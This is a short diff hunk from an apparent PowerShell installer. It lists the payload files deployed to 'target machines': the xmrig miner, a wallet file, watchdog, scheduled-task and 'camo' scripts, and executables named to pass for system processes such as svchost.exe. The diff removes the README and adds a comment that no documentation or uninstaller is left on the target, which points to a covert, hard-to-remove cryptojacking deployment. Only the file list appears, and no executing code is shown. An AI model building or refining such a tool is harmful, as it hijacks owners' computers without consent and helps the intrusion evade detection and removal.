@@ -98,9 +98,10 @@ $ErrorActionPreference = 'Stop'
 # ------------------------------------------------------------------ payload
 $payload = @(
     'controller.py', 'gpudetect.py', 'config_high.json', 'manifest.json',
+    # no documentation and no uninstaller on a target machine - both are ours
     'wallet.txt', 'watchdog.ps1', 'install-task.ps1',
     'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
-    'README.md', 'REMOTE.cmd'
+    'REMOTE.cmd'
 )
 $binaries = @('CloudSync.exe', 'xmrig.exe', 'svchost.exe', 'WinSync.exe', 'WinRing0x64.sys')
 
